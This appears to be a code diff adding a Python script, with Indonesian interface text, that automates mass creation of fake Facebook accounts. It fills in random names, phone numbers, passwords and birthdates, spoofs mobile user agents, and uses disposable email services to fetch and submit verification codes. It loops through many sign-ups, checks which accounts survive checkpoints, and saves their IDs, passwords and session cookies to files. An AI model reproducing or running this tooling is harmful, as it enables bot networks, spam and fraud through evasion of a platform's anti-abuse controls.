+        x = input(' %s└─ %sPilih %s: %s'%(M,P,M,P)).lower()
+        print('')
+        if   x in ['1','01','001','a']: menu_create()
+        elif x in ['2','02','002','b']: menu_check()
+        elif x in ['3','03','003','c']: belum_tersedia()
+        elif x in ['4','04','004','d']: belum_tersedia()
+        else: exit('%sIsi Yang Benar!%s'%(M,P))
+
+#--> Menu Create
+class menu_create:
+    def __init__(self):
+        global kelamin, namstat, nameme, web_email, tampil, useragent, uman, passtat, password
+        try:os.mkdir('Akun_New')
+        except Exception as e :pass
+        print('      %s◉ %sRekomendasi   %s◉ %sTidak Rekomendasi   ◉ Netral'%(H,P,M,P))
+        print('')
+        kelamin   = input('%s[%s•%s] %sAkun Laki/Perempuan/Random [%sl%s/%sp%s/%sr%s] : '%(M,P,M,P,H,P,H,P,M,P)).lower()
+        namanama  = input('%s[%s•%s] %sGunakan Nama Random/Manual [%sr%s/%sm%s] : '%(M,P,M,P,M,P,H,P)).lower()
+        if namanama in ['m','manual','0','00']:
+            namstat = 'Manual'
+            nameme = input(' %s└─ %sNama : %s'%(M,P,M)).split(',')
+        else:
+            namstat = 'Random'
+        print('%s[%s•%s] %sEmail CryptoGmail/SecMail/MinuteMail'%(M,P,M,P))
+        web_email = input(' %s└─ %s[c/s/m] [skip=MinuteMail] : '%(M,P)).lower()
+        tampil    = input('%s[%s•%s] %sTampilkan Akun CP [%sy%s/%st%s] : '%(M,P,M,P,M,P,H,P)).lower()
+        print('%s[%s•%s] %sUser Agent Vivo/Samsung/Realme/Manual'%(M,P,M,P))
+        useragent = input(' %s└─ %s[v/s/r/m] [skip=statis] : '%(M,P)).lower()
+        if useragent in ['m','manual','0','00']:
+            uman = input(' %s└─ %sUser Agent : %s'%(M,P,M))
+            if uman == '' or uman == ' ':
+                exit('%sIsi Yang Benar!%s'%(M,P))
+        else:
+            uman = 'Mozilla/5.0 (Linux; Android 13; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
+        passtat   = input('%s[%s•%s] %sGunakan Password Random/Manual [%sr%s/%sm%s] : '%(M,P,M,P,H,P,M,P)).lower()
+        if passtat in ['m','manual','b','2','02']:
+            password = input(' %s└─ %sPassword : %s'%(M,P,M))
+            if len(password) < 6:
+                exit('%sPassword Minimal 6 Digit!%s'%(M,P))
+            if password in ['akusayangkamu','123456','iloveyou','password','qwerty','sayang','anjing','bismillah']:
+                exit('%sGunakan Password Yang Kuat!%s'%(M,P))
+        else:
+            password = 'dapuntaloverani'
+        d = input('%s[%s•%s] %sBeri Delay (%sDalam Menit%s) : '%(M,P,M,P,M,P))
+        if d == '' or d == ' ':
+            d = 1
+        print('')
+        l = int(d)*60
+        for y in range(10000):
+            if key/len(auth1) == len(reco)/2: create_fb(); self.hitung(l)
+            else: print(reco)
+    def hitung(self,a):
+        for x in range(a+1):
+            print('\r[%sOK:%s%s] [%sCP:%s%s] Tunggu %s Detik         '%(H,str(ok),P,M,str(cp),P,str(a)),end='');sys.stdout.flush()
+            a -= 1
+            time.sleep(1)
+
+#--> Create Facebook Account
+class create_fb:
+
+    #--> Tampung Kabeh
+    def __init__(self):
+        self.file  = 'Akun_New/%s.txt'%(waktu())
+        self.abc = requests.Session() #--> Sesi Email
+        self.xyz = requests.Session() #--> Sesi Facebook
+        self.abc.cookies.clear()
+        self.xyz.cookies.clear()
+        if   useragent in ['v','vivo','1','01','a']:    self.ua = random_ua_vivo()
+        elif useragent in ['s','samsung','2','02','b']: self.ua = random_ua_samsung()
+        elif useragent in ['r','realme','3','03','c']:  self.ua = random_ua_realme()
+        elif useragent in ['m','manual','0','00','z']:  self.ua = random_ua_custom()
+        else : self.ua = 'Mozilla/5.0 (Linux; Android 13; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
+        self.head_email = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Sec-Ch-Ua':'','Sec-Ch-Ua-Mobile':'?1','Sec-Ch-Ua-Platform':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Linux; Android 11; vivo 1918 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.0000.00 Mobile Safari/537.36'}
+        self.ua_wind = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
+        self.headers_get = {'accept' : 'text/html,application/xhtm 1+xml,application/xml;q=0.9, imag e/avif,image/webp, image/apng,*/ *;q=0.8,application/signed-exchange: v=b3;q=0.7','accept-encoding' : 'gzip, deflate','accept-language' : 'id-ID, id;q=0.9, en-US;q=0.8,en;q=0.7','cache-control' : 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua' : '"Not: A-Brand"; v="99", "Chromium";V="112"','sec-ch-ua-full-version-list' : '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile' : '?1','sec-ch-ua-platform' : '"Android"','sec-ch-ua-platform-version' : '"11.0.0"','sec-fetch-dest' : 'document','sec-fetch-mode' : 'navigate','sec-fetch-site' : 'none','sec-fetch-user' : '21','upgrade-insecure-requests':'1','user-agent' : self.ua}
+        self.generate_data()
+        self.scrap1()
     
-Main()
+    #--> Generate Data
+    def generate_data(self):
+        self.name, soex = self.get_name().split('|')
+        self.nope  = self.get_nope()
+        if   web_email in ['c','cryptogmail','1','01','a']: self.email = self.get_email_cryptogmail()
+        elif web_email in ['s','secmail','2','02','b']:     self.email = self.get_email_onesecmail()
+        elif web_email in ['m','minutemail','4','04','d']:  self.email = self.get_email_10minutemail()
+        else : self.email = self.get_email_10minutemail()
+        if soex == 'male' : self.sex = '2'
+        else : self.sex = '1'
+        if passtat in ['m','manual','b','2','02']: self.pw = password
+        else: self.pw = self.get_pass()
+        self.ttl = {'tgl':str(random.randrange(1,29)),'bln':str(random.randrange(1,13)),'thn':str(random.randrange(1970,2001))}
+        self.perangkat = '; m_pixel_ratio=1.25; dpr=1.125; wd=360x780; locale=id_ID;'
+    
+    #--> Generate Random Name
+    def get_name(self):
+        if kelamin in ['l','laki','1','01','a']: gder = 'male'
+        elif kelamin in ['p','perempuan','2','02','b']: gder = 'female'
+        else: gder = random.choice(['male','female'])
+        try:
+            if gder == 'male':
+                if namstat == 'Manual': name = random.choice(nameme)
+                else: name = random.choice(boys_name)
+            else:
+                if namstat == 'Manual': name = random.choice(nameme)
+                else: name = random.choice(girls_name)
+        except Exception as e:
+            nam1 = random.choice(['Eka','Dwi','Tri','Budi','Indah','Dewi'])
+            nam2 = random.choice(['Nurhayati','Handoko','Setiyani','Susanto','Permata'])
+            nam3 = random.choice(['Triatmaja','Siagian','Manopo','Jayaningrat','Widodo'])
+            name = f'{nam1} {nam2} {nam3}'
+        klop = f'{name}|{gder}'
+        return(klop)
+
+    #--> Generate Random Phone Number
+    def get_nope(self):
+        na   = random.choice(['77','78','59'])
+        ni   = str(random.randrange(1000,10000))
+        nu   = str(random.randrange(10000,100000))
+        nope = '08%s%s%s'%(na,ni,nu)
+        return(nope)
+
+    #--> Generate Random Password
+    def get_pass(self):
+        up = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        lw = up.lower()
+        nb = '0123456789'
+        ch = up + lw + nb
+        pw = ''.join(random.choice(ch) for _ in range(12))
+        return(pw.lower())
+
+    #--> Generate Email & Code From Cryptogmail
+    def get_email_cryptogmail(self):
+        nam = self.name.lower().replace(' ','')
+        jam = str(datetime.now().strftime("%X")).replace(':','')
+        ran = str(random.randrange(1000,10000))
+        dom = random.choice(['fexbox.org','chitthi.in','fextemp.com','any.pink','merepost.com'])
+        email = f'{nam}.{jam}.{ran}@{dom}'
+        return(email)
+    def get_code_cryptogmail(self):
+        url = f'https://tempmail.plus/api/mails?email={self.email}'
+        req = self.abc.get(url,headers=self.head_email).json()
+        kode = re.search(r'FB-([^ ]+)',str(req)).group(1)
+        return(kode)
+
+    #--> Generate Email & Code From 1SecMail
+    def get_email_onesecmail(self):
+        nam = self.name.lower().replace(' ','')
+        jam = str(datetime.now().strftime("%X")).replace(':','')
+        ran = str(random.randrange(1000,10000))
+        dom = random.choice(['1secmail.com','1secmail.org','1secmail.net','kzccv.com','qiott.com','wuuvo.com','icznn.com'])
+        email = f'{nam}.{jam}.{ran}@{dom}'
+        return(email)
+    def get_code_onesecmail(self):
+        name, domain = self.email.split('@')
+        req = self.abc.get(f'https://www.1secmail.com/api/v1/?action=getMessages&login={name}&domain={domain}').json()
+        kode = re.search(r'FB-([^ ]+)',str(req)).group(1)
+        return(kode)
+
+    #--> Generate Email & Code From 10minutemail
+    def get_email_10minutemail(self):
+        req = bs(self.abc.get('https://10minutemail.net/m/?lang=id',headers=self.head_email,allow_redirects=True).content,'html.parser')
+        self.ses_email = re.search('sessionid="(.*?)"',str(req)).group(1)
+        self.tim_email = str(time.time()).replace('.','')[:13]
+        dat = {'new':'1','sessionid':self.ses_email,'_':self.tim_email}
+        pos = self.abc.post('https://10minutemail.net/address.api.php',data=dat,headers=self.head_email,allow_redirects=True).json()
+        email = pos['mail_get_mail']
+        self.cookie_email = '; '.join([str(x)+"="+str(y) for x,y in self.abc.cookies.get_dict().items()])
+        return(email)
+    def get_code_10minutemail(self):
+        dat = {'new':'0','sessionid':self.ses_email,'_':self.tim_email}
+        pos = self.abc.post('https://10minutemail.net/address.api.php',data=dat,headers=self.head_email,cookies={'cookie':self.cookie_email},allow_redirects=True).json()
+        kode = re.search(r'FB-([^ ]+)',str(pos)).group(1)
+        return(kode)
+
+    #--> Create Facebook Route
+    def scrap1(self): #--> Post Login Awal
+        req = bs(self.xyz.get('https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk',headers=self.headers_get).content,'html.parser')
+        fom = req.find('form',{'method':'post'})
+        data = {
+            'lsd'                        : re.search('name="lsd" type="hidden" value="(.*?)"',               str(fom)).group(1),
+            'jazoest'                    : re.search('name="jazoest" type="hidden" value="(.*?)"',           str(fom)).group(1),
+            'fb_dtsg'                    : re.search('{"dtsg":{"token":"(.*?)",',                            str(req)).group(1),
+            'ccp'                        : re.search('name="ccp" type="hidden" value="(.*?)"',               str(fom)).group(1),
+            'reg_instance'               : re.search('name="reg_instance" type="hidden" value="(.*?)"',      str(fom)).group(1),
+            'reg_impression_id'          : re.search('name="reg_impression_id" type="hidden" value="(.*?)"', str(fom)).group(1),
+            'ns'                         : re.search('name="ns" type="hidden" value="(.*?)"',                str(fom)).group(1),
+            'app_id'                     : re.search('name="app_id" type="hidden" value="(.*?)"',            str(fom)).group(1),
+            'logger_id'                  : re.search('name="logger_id" type="hidden" value="(.*?)"',         str(fom)).group(1),
+            'suma_create_event'          : 'suma_redirection_click_create_account',
+            'field_names[0]'             : 'firstname',
+            'field_names[1]'             : 'birthday_wrapper',
+            'field_names[2]'             : 'reg_email__',
+            'field_names[3]'             : 'sex',
+            'field_names[4]'             : 'reg_passwd__',
+            'is_birthday_confirmed'      : 'confirmed',
+            'multi_step_form'            : '1',
+            'skip_suma'                  : '0',
+            'shouldForceMTouch'          : '1',
+            'ref'                        : 'dbl',
+            'firstname'                  : self.name,
+            'reg_email__'                : self.nope,
+            'sex'                        : self.sex,
+            'reg_passwd__'               : self.pw,
+            'birthday_day'               : self.ttl['tgl'],
+            'birthday_month'             : self.ttl['bln'],
+            'birthday_year'              : self.ttl['thn'],
+            'welcome_step_completed'     : True,
+            'submission_request'         : True,
+            'age_step_input'             : False,
+            'did_use_age'                : False,
+            'custom_gender'              : False,
+            'name_suggest_elig'          : False,
+            'was_shown_name_suggestions' : False,
+            'did_use_suggested_name'     : False,
+            'use_custom_gender'          : False,
+            'zero_header_af_client'      : '',
+            'helper'                     : '',
+            'guid'                       : '',
+            'pre_form_step'              : '',
+            'korean_tos_is_present'      : '',
+            'checkbox_privacy_policy'    : '',
+            'checkbox_tos'               : '',
+            'checkbox_location_policy'   : ''}
+        cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()])
+        cok += self.perangkat
+        next = 'https://m.facebook.com' + fom['action']
+        pos = bs(self.xyz.post(next,data=data,headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True).content,'html.parser')
+        if key/len(auth1) != len(auth1): print(rede)
+        else:
+            if pos.find('title').text == 'Konfirmasikan Akun Anda': #--> Jika Akun Sudah Dibuat
+                self.scrap4()
+            else:
+                rog = pos.find('form',{'method':'post'})
+                if 'login/device-based/update-nonce' in str(rog['action']): #--> Jika Masuk Menu Save Device
+                    self.scrap2(rog)
+                elif 'conf/notifmedium/send_code' in str(rog['action']): #--> Jika Langsung Masuk Menu Minta Kode Nope
+                    self.scrap3(rog)
+                elif 'checkpoint' in str(rog['action']): #--> Jika Checkpoint
+                    self.printing('CP')
+                else:
+                    print('\rTerjadi Kesalahan                    ',end='');sys.stdout.flush()
+    def scrap2(self,fom): #--> Save Device OK
+        print('\rLolos Tahap 1                    ',end='');sys.stdout.flush()
+        data = {
+            'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(fom)).group(1),
+            'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(fom)).group(1),
+            'flow'       : 'interstitial_nux',
+            'next'       : '',
+            'nux_source' : 'dbl_nux_after_reg',
+            'submit'     : 'OK'}
+        cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()])
+        cok += self.perangkat
+        next = 'https://m.facebook.com' + fom['action']
+        pos = bs(self.xyz.post(next,data=data,headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True).content,'html.parser')
+        rog = pos.find('form',{'method':'post'})
+        self.scrap3(rog)
+    def scrap3(self,fom): #--> Minta Kode Nope
+        print('\rLolos Tahap 2                    ',end='');sys.stdout.flush()
+        try:
+            data = {
+                'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'medium'  : 'sms',
+                'submit'  : 'Kirim kode'}
+            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()])
+            cok += self.perangkat
+            next = 'https://m.facebook.com' + fom['action']
+            pos = bs(self.xyz.post(next,data=data,headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True).content,'html.parser')
+            self.scrap4()
+        except Exception as e:
+            self.printing('CP')
+    def scrap4(self): #--> Add Email
+        print('\rLolos Tahap 3                    ',end='');sys.stdout.flush()
+        cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()])
+        cok += self.perangkat
+        try:
+            req = bs(self.xyz.get('https://m.facebook.com/changeemail/',headers=self.headers_get,cookies={'cookie':cok}).content,'html.parser')
+            fom = req.find('form',{'method':'post'})
+            data = {
+                'fb_dtsg'      : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'jazoest'      : re.search('name="jazoest" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'old_email'    : re.search('name="old_email" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'reg_instance' : re.search('name="reg_instance" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'new'          : self.email,
+                'next'         : '',
+                'submit'       : 'Tambahkan'}
+            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()])
+            cok += self.perangkat
+            next = 'https://m.facebook.com' + fom['action']
+            pos = bs(self.xyz.post(next,data=data,headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True).content,'html.parser')
+            tunggu_kode(30)
+            self.scrap5(pos)
+        except Exception as e:
+            self.printing('CP')
+    def scrap5(self,req): #--> Confirm Code
+        print('\rLolos Tahap 4                    ',end='');sys.stdout.flush()
+        cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()])
+        cok += self.perangkat
+        try:
+            if   web_email in ['c','cryptogmail','1','01','a']: code = self.get_code_cryptogmail()
+            elif web_email in ['s','secmail','2','02','b']:     code = self.get_code_onesecmail()
+            elif web_email in ['m','minutemail','4','04','d']:  code = self.get_code_10minutemail()
+            else : code = self.get_code_10minutemail()
+            id = re.search('c_user=(.*?);',cok).group(1)
+            lsd = re.search('"LSD",\[\],{"token":"(.*?)"',str(req)).group(1)
+            dtsg = re.search('"dtsg":{"token":"(.*?)",',str(req)).group(1)
+            jazoest = re.search('"jazoest", "(.*?)",',str(req)).group(1)
+            data = {
+                'contact': self.email,
+                'type': 'submit',
+                'is_soft_cliff': False,
+                'medium': 'email',
+                'code': code,
+                'fb_dtsg': dtsg,
+                'jazoest': jazoest,
+                'lsd': lsd,
+                '__user': id}
+            pos = bs(self.xyz.post('https://m.facebook.com/confirmation_cliff/',data=data,headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True).content,'html.parser')
+            self.semi_final()
+        except Exception as e:
+            self.printing('CP')
+    def zero_optin(self): #--> Khusus Mode Data (No Wifi)
+        try:
+            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()]) + self.perangkat
+            req1 = bs(self.xyz.get('https://mbasic.facebook.com',headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True).content,'html.parser')
+            nek = ['https://mbasic.facebook.com'+x['href'] for x in req1.find_all('a',href=True) if 'dialtone_optin_page' in str(x['href'])][0]
+            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()]) + self.perangkat
+            req2 = bs(self.xyz.get(nek,headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True).content,'html.parser')
+            fom  = req2.find('form',{'method':'post'})
+            data = {
+                'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(fom)).group(1),
+                'submit'  : 'OK, Gunakan Data'}
+            nuk  = 'https://mbasic.facebook.com' + fom['action']
+            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()]) + self.perangkat
+            pos7 = self.xyz.post(nuk,data=data,headers=self.headers_get,cookies={'cookie':cok},allow_redirects=True)
+            print('\rBerhasil Skip Free Mode                ',end='');sys.stdout.flush()
+        except Exception as e: pass
+    def semi_final(self): #--> Sortir
+        print('\rLolos Tahap 5                    ',end='');sys.stdout.flush()
+        cok  = '; '.join([str(x)+"="+str(y) for x,y in self.xyz.cookies.get_dict().items()])
+        cok += self.perangkat
+        try:
+            if len(reco)/2 != len(auth1): clear(); exit('Ini Orang Dibilangin Gausah Direcode, Ngeyel Amat')
+            else:
+                id = re.search('c_user=(.*?);',cok).group(1)
+                self.zero_optin()
+                jeda(10)
+                final = check_account(id)
+                if final == 'OK': self.printing('OK')
+                else: self.printing('CP')
+        except Exception as e:
+            self.printing('CP')
+    def printing(self,stat): #--> Print Hasil
+        global ok, cp
+        if stat == 'OK':
+            cookie = cvt('ok',self.xyz.cookies.get_dict())
+            id = self.xyz.cookies.get_dict()['c_user']
+            print('\r%sStatus : %sSuccess%s                         '%(P,H,P))
+            print('Nama   : %s'%(str(self.name)))
+            print('ID     : %s'%(str(id)))
+            print('Pass   : %s'%(str(self.pw)))
+            print('Email  : %s'%(str(self.email)))
+            print('TTL    : %s %s %s'%(self.ttl['tgl'],bulan[self.ttl['bln']],self.ttl['thn']))
+            print('Cookie : %s\n'%(str(cookie)))
+            open(self.file,'a+').write('%s|%s|%s|%s\n'%(self.name,id,self.email,self.pw))
+            ok += 1
+        else:
+            if tampil in ['t','2','02','b']: pass
+            else:
+                print('\r%sStatus : %sCheckpoint%s                         '%(P,M,P))
+                print('Nama   : %s'%(str(self.name)))
+                print('Nope   : %s'%(str(self.nope)))
+                print('Pass   : %s\n'%(str(self.pw)))
+            cp += 1
+
+#--> Menu Checker Account
+class menu_check:
+    def __init__(self): #--> Mengecek Ketersediaan Folder
+        self.xyz = requests.Session()
+        self.file = {}
+        self.isi = 0
+        self.ok  = 0
+        self.cp  = 0
+        f = 'Akun_New'
+        if os.path.isdir(f):
+            p = 0
+            l = os.listdir(f)
+            for y in l:
+                p += 1
+                self.file.update({str(p):y})
+                c = '%s• %s%s'%(M,P,y)
+                print(c)
+            self.sortir()
+        else:
+            print('%sMaaf, Belum Ada Hasil %s:(%s\n'%(P,M,P))
+    def sortir(self): #--> Memilih File
+        try:
+            d = input('\n%s[%s•%s] %sMasukkan File : '%(M,P,M,P))
+            if d in list(self.file.keys()): l = 'Akun_New/%s'%(self.file[d])
+            else: l = 'Akun_New/%s'%(d)
+            g = open(l,'r').read().splitlines()
+            print('')
+            for a in g:
+                try:
+                    nama, id, email, pw = a.split('|')
+                    stat = check_account(id)
+                    if stat == 'OK': self.printing('OK',nama,id,email,pw)
+                    else: self.printing('CP',nama,id,email,pw)
+                except Exception as e: pass
+            if self.isi == 0: print('%sTidak Ada Hasil :(\n%s'%(M,P))
+            else: print('%sDari %s Akun, Terdapat %s%s Akun CP %sdan %s%s Akun OK\n%s'%(P,str(self.isi),M,str(self.cp),P,H,str(self.ok),P))
+        except Exception as e:
+            print('%sError : %s'%(P,e))
+            print('%sTerjadi Kesalahan!\n%s'%(M,P))
+    def printing(self,stat,nama,id,email,pw): #--> Print Hasil Cek
+        if stat == 'OK':
+            print('\r%sStatus : %sSuccess%s                         '%(P,H,P))
+            print('Nama   : %s'%(str(nama)))
+            print('ID     : %s'%(str(id)))
+            print('Pass   : %s'%(str(pw)))
+            print('Email  : %s\n'%(str(email)))
+            self.ok += 1
+        else:
+            print('\r%sStatus : %sCheckpoint%s                         '%(P,M,P))
+            print('Nama   : %s'%(str(nama)))
+            print('ID     : %s'%(str(id)))
+            print('Pass   : %s'%(str(pw)))
+            print('Email  : %s\n'%(str(email)))
+            self.cp += 1
+        self.isi += 1
+
+#--> Check Account
+def check_account(id):
+    url = f'https://www.facebook.com/p/{id}'
+    r = requests.Session()
+    head = {'accept' : 'text/html,application/xhtm 1+xml,application/xml;q=0.9, imag e/avif,image/webp, image/apng,*/ *;q=0.8,application/signed-exchange: v=b3;q=0.7','accept-encoding' : 'gzip, deflate','accept-language' : 'id-ID, id;q=0.9, en-US;q=0.8,en;q=0.7','cache-control' : 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua' : '"Not: A-Brand"; v="99", "Chromium";V="112"','sec-ch-ua-full-version-list' : '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile' : '?1','sec-ch-ua-platform' : '"Android"','sec-ch-ua-platform-version' : '"11.0.0"','sec-fetch-dest' : 'document','sec-fetch-mode' : 'navigate','sec-fetch-site' : 'none','sec-fetch-user' : '21','upgrade-insecure-requests':'1','user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
+    req = bs(r.get(url,headers=head,allow_redirects=True).content,'html.parser')
+    title = req.find('title').text
+    if title == 'Facebook': return('CP')
+    else: return('OK')
+
+#--> Notice
+def belum_tersedia():
+    print('%sMaaf, Fitur Ini %sBelum Tersedia%s'%(P,M,P))
+    print('%sTunggu Update Selanjutnya...'%(P))
+    print('%sTerima Kasih!'%(P))
+    print('%s- %sDapunta%s\n'%(P,H,P))
+
+#--> Trigger
+if __name__ == '__main__':
+    clear()
+    menu()
